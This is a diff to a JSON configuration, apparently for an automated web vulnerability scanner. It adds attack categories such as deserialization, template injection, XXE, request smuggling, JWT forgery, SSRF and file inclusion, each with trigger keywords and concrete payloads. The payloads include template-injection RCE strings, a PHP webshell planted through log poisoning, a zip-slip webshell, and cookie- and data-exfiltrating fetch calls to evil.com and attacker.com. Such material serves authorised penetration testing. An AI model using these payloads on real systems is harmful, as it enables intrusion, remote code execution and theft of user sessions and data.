@@ -1,43 +1,356 @@
 {
-  "custom_api_behavior": {
-    "description": "Custom API with potential zero-day",
+  "deserialization_sink": {
+    "description": "Unsafe deserialization — Java/PHP/Python object deserialization leads to RCE via gadget chains",
     "indicators": [
-      "custom_api",
-      "unusual_endpoint",
-      "proprietary"
+      "viewstate",
+      "serialized",
+      "deserializ",
+      "pickle",
+      "__wakeup",
+      "readobject",
+      "java.io",
+      "rO0AB",
+      "phpobject"
     ],
     "test_vectors": [
-      "Fuzz with unusual characters",
-      "Test JSON parsing edge cases",
-      "Test with null/undefined values"
-    ]
+      "Java ysoserial: send base64(ysoserial CommonsCollections5 'nslookup attacker.com') — check OOB DNS for blind RCE",
+      "PHP: inject O:8:\"stdClass\":1:{s:4:\"test\";s:2:\"hi\";} in cookie/POST param — observe unserialize() errors or __wakeup side effects",
+      "Python pickle: send base64(pickle.dumps(os.system('id'))) in data/session field — observe command execution or 500 error",
+      "ASP.NET ViewState: decode existing ViewState, inject ysoserial .NET payload, re-encode and resend"
+    ],
+    "severity": "CRITICAL"
   },
-  "complex_interaction": {
-    "description": "Complex multi-step interaction",
+  "prototype_pollution": {
+    "description": "Prototype pollution — __proto__/constructor manipulation in Node.js/JS bypasses auth or escalates to RCE",
     "indicators": [
-      "multi_step",
-      "stateful",
-      "workflow"
+      "nodejs",
+      "express",
+      "lodash",
+      "__proto__",
+      "deepmerge",
+      "angular",
+      "nestjs",
+      "fastify",
+      "prototype"
     ],
     "test_vectors": [
-      "Skip steps",
-      "Repeat steps",
-      "Change order",
-      "Test race conditions"
-    ]
+      "JSON body: POST with {\"__proto__\":{\"admin\":true}} then re-request restricted endpoint — check if admin access granted",
+      "URL params: GET /?__proto__[isAdmin]=1 or /?constructor[prototype][role]=admin",
+      "Merge endpoint: PUT /api/settings with {\"__proto__\": {\"debug\":true}} — verify if global debug state changes",
+      "Nested: {\"a\":{\"__proto__\":{\"polluted\":\"yes\"}}} in deep-merge operations — confirm via subsequent error messages"
+    ],
+    "severity": "HIGH"
   },
-  "file_processing": {
-    "description": "File processing zero-day potential",
+  "graphql_deep_attack": {
+    "description": "GraphQL — introspection, batching abuse, depth/complexity bypass, IDOR via node queries",
     "indicators": [
-      "file_upload",
-      "image_process",
-      "document_parse"
+      "graphql",
+      "/gql",
+      "__schema",
+      "__type",
+      "mutation",
+      "subscription",
+      "apollo",
+      "hasura",
+      "prisma"
     ],
     "test_vectors": [
-      "Malformed files",
-      "Polyglot files",
-      "Large files",
-      "Recursive compression"
-    ]
+      "Schema dump: POST /graphql {\"query\":\"{__schema{types{name fields{name type{name}}}}}\"} — find hidden mutations and sensitive types",
+      "Batching bypass: [{\"query\":\"mutation{login(u:'admin',p:'$FUZZ')}\"}] x1000 in single request to bypass rate limiting",
+      "IDOR enumeration: query {node(id:2){...on User{email role}}} incrementing IDs — access cross-account data",
+      "Field suggestion: send invalid field name — use 'Did you mean X?' error hints to discover undocumented sensitive fields"
+    ],
+    "severity": "HIGH"
+  },
+  "ssti_template_engine": {
+    "description": "Server-Side Template Injection — template engine processes user input, leading to arbitrary code execution",
+    "indicators": [
+      "jinja",
+      "twig",
+      "freemarker",
+      "velocity",
+      "smarty",
+      "thymeleaf",
+      "template",
+      "render",
+      "preview",
+      "pebble"
+    ],
+    "test_vectors": [
+      "Probe: inject {{7*7}} and ${7*7} and #{7*7} in ALL string inputs — response containing 49 confirms SSTI",
+      "Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+      "FreeMarker RCE: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
+      "Twig RCE: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+    ],
+    "severity": "CRITICAL"
+  },
+  "xxe_xml_processing": {
+    "description": "XXE injection — XML/SOAP/SVG external entity processing enables file read, SSRF, and data exfiltration",
+    "indicators": [
+      "soap",
+      "wsdl",
+      "xslt",
+      "svg",
+      "/xml",
+      "docx",
+      "xlsx",
+      "rss",
+      "atom",
+      "feed",
+      "saml"
+    ],
+    "test_vectors": [
+      "Classic: POST with Content-Type:text/xml and <!DOCTYPE f [<!ENTITY e SYSTEM 'file:///etc/passwd'>]><f>&e;</f>",
+      "OOB blind: <!ENTITY % p SYSTEM 'http://attacker.com/'> — detect via DNS/HTTP callback using Burp Collaborator",
+      "SVG upload: <svg><image href='file:///etc/passwd'/></svg> — trigger via image render/thumbnail endpoint",
+      "SAML assertion: inject XXE in base64-decoded SAML request before re-encoding and submitting to IdP endpoint"
+    ],
+    "severity": "CRITICAL"
+  },
+  "websocket_hijacking": {
+    "description": "Cross-Site WebSocket Hijacking — unvalidated Origin allows attacker to send privileged WebSocket messages",
+    "indicators": [
+      "websocket",
+      "socket.io",
+      "sockjs",
+      "signalr",
+      "upgrade",
+      "realtime",
+      "ws://"
+    ],
+    "test_vectors": [
+      "CSWSH PoC: HTML page on attacker.com opens new WebSocket('wss://target/ws') — check if connection accepted without CSRF token",
+      "Origin bypass: send Origin: null (sandboxed iframe) or Origin: https://evil.target.com (regex check bypass)",
+      "Binary frames: send binary WebSocket frames instead of text — many parsers handle them differently and may crash or leak data",
+      "Protocol upgrade CSRF: craft cross-origin form that upgrades to WebSocket — send privileged commands as authenticated user"
+    ],
+    "severity": "HIGH"
+  },
+  "cache_poisoning": {
+    "description": "Web cache poisoning — attacker-controlled headers injected into cached responses served to all users",
+    "indicators": [
+      "varnish",
+      "cloudflare",
+      "fastly",
+      "akamai",
+      "cdn",
+      "x-cache",
+      "squid",
+      "traefik",
+      "cf-cache"
+    ],
+    "test_vectors": [
+      "X-Forwarded-Host: attacker.com — verify if poisoned host reflects in cached response body (host-based cache poison)",
+      "X-Original-URL: /admin — some caches serve /admin cached response for / requests bypassing path-based access control",
+      "Vary header poison: inject X-Evil: <script>alert(1)</script> in unkeyed header — poison cache with XSS payload",
+      "Fat GET: send XSS payload in GET request body — cache keys only on URL, backend processes body and caches XSS"
+    ],
+    "severity": "HIGH"
+  },
+  "http_request_smuggling": {
+    "description": "HTTP Request Smuggling — TE/CL desync between frontend proxy and backend server bypasses auth and WAF",
+    "indicators": [
+      "haproxy",
+      "varnish",
+      "envoy",
+      "traefik",
+      "h2c",
+      "chunked",
+      "transfer-encoding",
+      "http/2"
+    ],
+    "test_vectors": [
+      "CL.TE: POST with Content-Length:6 + Transfer-Encoding:chunked, body '0\\r\\n\\r\\nX' — probe for backend prefix injection",
+      "TE.TE obfuscation: Transfer-Encoding: xchunked or Transfer-Encoding\\x09: chunked — some backends process it, frontend ignores",
+      "H2C smuggling: send Connection: Upgrade, HTTP2-Settings + Upgrade: h2c to HTTP/1.1 endpoint — backend may process as HTTP/2",
+      "Confirm: after smuggled prefix injection, check if subsequent innocent request returns poisoned response (403→200 on /admin)"
+    ],
+    "severity": "CRITICAL"
+  },
+  "jwt_confusion_attacks": {
+    "description": "JWT advanced attacks — alg:none bypass, RS256/HS256 confusion, kid header injection, weak secret brute force",
+    "indicators": [
+      "jwt",
+      "bearer",
+      "eyj",
+      "authorization",
+      "jwks",
+      "kid",
+      "openid",
+      "oauth2"
+    ],
+    "test_vectors": [
+      "alg:none: change header to {\"alg\":\"none\"} and remove signature — send as eyJhbGciOiJub25lIn0.PAYLOAD. (trailing dot)",
+      "RS256→HS256: take server's public key from /jwks.json, sign token with HMAC-SHA256 using pubkey, set alg:HS256",
+      "kid path traversal: set kid to ../../../dev/null and sign with empty string, or kid SQL: ' UNION SELECT 'x' --",
+      "Brute force: hashcat -a 0 -m 16500 token.jwt rockyou.txt — many apps use 'secret', 'password', or app name"
+    ],
+    "severity": "HIGH"
+  },
+  "ssrf_via_headers": {
+    "description": "Header-based SSRF — Host/X-Forwarded-For/Referer headers trigger server-side requests to internal services",
+    "indicators": [
+      "webhook",
+      "callback",
+      "notify",
+      "fetch",
+      "x-forwarded",
+      "redirect",
+      "proxy",
+      "forward"
+    ],
+    "test_vectors": [
+      "Host header injection: set Host: 169.254.169.254 — forces cloud metadata SSRF when backend reflects the Host in requests",
+      "X-Forwarded-Host: internal-service.local — test resolution of internal hostnames via header reflection",
+      "Protocol escalation: try gopher://127.0.0.1:6379/_PING (Redis), dict://127.0.0.1:11211/stats (Memcached) in URL params",
+      "Referer SSRF: Referer: http://169.254.169.254/latest/meta-data/ — some apps process/log Referer as outbound request"
+    ],
+    "severity": "CRITICAL"
+  },
+  "type_confusion_juggling": {
+    "description": "Type confusion/juggling — PHP loose comparison, JS coercion, integer overflow bypass authentication/validation",
+    "indicators": [
+      "php",
+      "login",
+      "md5",
+      "sha1",
+      "hash",
+      "verify",
+      "compare",
+      "laravel",
+      "symfony",
+      "wordpress"
+    ],
+    "test_vectors": [
+      "PHP magic hash: password '240610708' hashes to 0e... — PHP == comparison treats 0e... as 0 (scientific notation)",
+      "Array bypass: send username[]=admin&password[]=anything — PHP in_array() on array input causes type coercion",
+      "JSON null: send {\"role\":null} or {\"admin\":true} — some ORMs/deserialization layers bypass strict type enforcement",
+      "Integer overflow: send id=9223372036854775808 (INT64_MAX+1) — wraps to negative value, may match privileged record IDs"
+    ],
+    "severity": "HIGH"
+  },
+  "second_order_injection": {
+    "description": "Second-order injection — stored payload triggers in different security context (admin panel, export, email template)",
+    "indicators": [
+      "profile",
+      "comment",
+      "review",
+      "note",
+      "message",
+      "export",
+      "report",
+      "import",
+      "feedback",
+      "username"
+    ],
+    "test_vectors": [
+      "Stored XSS: save <img src=x onerror=fetch('https://evil.com?c='+document.cookie)> in profile/name field — trigger in admin panel view",
+      "Stored SQLi: register username as admin'-- then trigger login/reset query using stored name without re-escaping",
+      "Stored SSTI: save {{config.items()}} as display name — rendered in email template or admin dashboard confirmation",
+      "CSV injection: =HYPERLINK('http://attacker.com','click') in name/note — triggers when admin exports users to CSV and opens"
+    ],
+    "severity": "HIGH"
+  },
+  "cors_misconfiguration": {
+    "description": "CORS misconfiguration — reflective/null/subdomain origin with credentials allows cross-origin session data theft",
+    "indicators": [
+      "access-control",
+      "cors",
+      "cross-origin",
+      "credentials",
+      "allow-origin",
+      "preflight",
+      "options"
+    ],
+    "test_vectors": [
+      "Reflect test: send Origin: https://evil.com — if ACAO: https://evil.com + ACAC: true, full cross-origin credential exploit",
+      "Null origin: send Origin: null — accessible from sandboxed iframe, some configs explicitly allowlist null",
+      "Subdomain takeover chain: Origin: https://sub.target.com — if subdomain is claimable, CORS bypass via takeover",
+      "PoC JS: fetch('https://target/api/user',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://evil.com?d='+JSON.stringify(d)))"
+    ],
+    "severity": "HIGH"
+  },
+  "debug_endpoint_exposure": {
+    "description": "Debug/diagnostic endpoints exposed — actuator, phpinfo, swagger leak credentials, env vars, and heap dumps",
+    "indicators": [
+      "actuator",
+      "phpinfo",
+      "swagger",
+      "api-docs",
+      "openapi",
+      "debug",
+      "trace",
+      "metrics",
+      "heapdump",
+      "jolokia"
+    ],
+    "test_vectors": [
+      "Spring Boot: GET /actuator/env (env vars+secrets), /actuator/heapdump (full memory), /actuator/jolokia (JMX RCE via POST)",
+      "Django DEBUG=True: trigger 500 with malformed input — get full stack trace with local variables, settings, and SECRET_KEY",
+      "PHP exposure: curl /.env, /phpinfo.php, /info.php, /server-status, /web.config — check for credentials in output",
+      "Swagger: GET /api-docs or /openapi.json — enumerate ALL endpoints including undocumented admin/internal ones"
+    ],
+    "severity": "HIGH"
+  },
+  "insecure_file_inclusion": {
+    "description": "LFI chain to RCE — file inclusion + log/session poisoning enables server-side code execution via wrapper",
+    "indicators": [
+      "?file=",
+      "?page=",
+      "?path=",
+      "?template=",
+      "?module=",
+      "/include",
+      "/require",
+      "plugin",
+      "theme"
+    ],
+    "test_vectors": [
+      "Log poisoning: inject <?php system($_GET['cmd'])?> in User-Agent header then ?file=/var/log/apache2/access.log&cmd=id",
+      "PHP session: ?file=/var/lib/php/sessions/sess_PHPSESSID — control session data via register/login to inject PHP code",
+      "PHP filter base64: ?file=php://filter/convert.base64-encode/resource=/etc/passwd — read arbitrary files encoded",
+      "Zip slip: upload archive with ../../../../var/www/html/shell.php entry — writes webshell on extraction"
+    ],
+    "severity": "CRITICAL"
+  },
+  "parameter_pollution_waf_bypass": {
+    "description": "HTTP Parameter Pollution — duplicate/array params exploit parser inconsistency to bypass WAF and input filters",
+    "indicators": [
+      "waf",
+      "filter",
+      "blocked",
+      "firewall",
+      "sanitize",
+      "403",
+      "forbidden",
+      "cloudflare"
+    ],
+    "test_vectors": [
+      "Duplicate params: GET /search?q=safe&q=<script>alert(1)</script> — WAF validates first, backend uses second/last value",
+      "Array params: ?id[]=1&id[]=../../etc/passwd — some frameworks merge arrays, bypassing scalar type validation",
+      "JSON duplicate key: {\"user\":\"normal\",\"user\":\"admin\"} — parsers using last-key-wins bypass WAF's first-value inspection",
+      "Null byte injection: ?q=legit%00<script> or ?file=safe.txt%00.php — null byte truncates server-side validation string"
+    ],
+    "severity": "MEDIUM"
+  },
+  "mass_assignment_priv_escalation": {
+    "description": "Mass assignment — REST API accepts undocumented privileged fields (admin, role, verified) for privilege escalation",
+    "indicators": [
+      "register",
+      "signup",
+      "profile",
+      "account",
+      "settings",
+      "/api/v",
+      "update",
+      "create"
+    ],
+    "test_vectors": [
+      "POST /register: {\"username\":\"x\",\"password\":\"x\",\"is_admin\":true,\"role\":\"admin\",\"verified\":true,\"plan\":\"enterprise\"}",
+      "PUT /api/profile: {\"id\":1,\"email\":\"x@x.com\",\"role\":\"superadmin\",\"credits\":999999,\"subscription\":\"lifetime\"}",
+      "Compare fields: GET /api/user returns {role, plan, verified} — include ALL those fields in PUT /api/user update request",
+      "readOnly bypass: find readOnly fields in Swagger schema — send them in write requests to test if backend enforces readOnly"
+    ],
+    "severity": "HIGH"
   }
 }
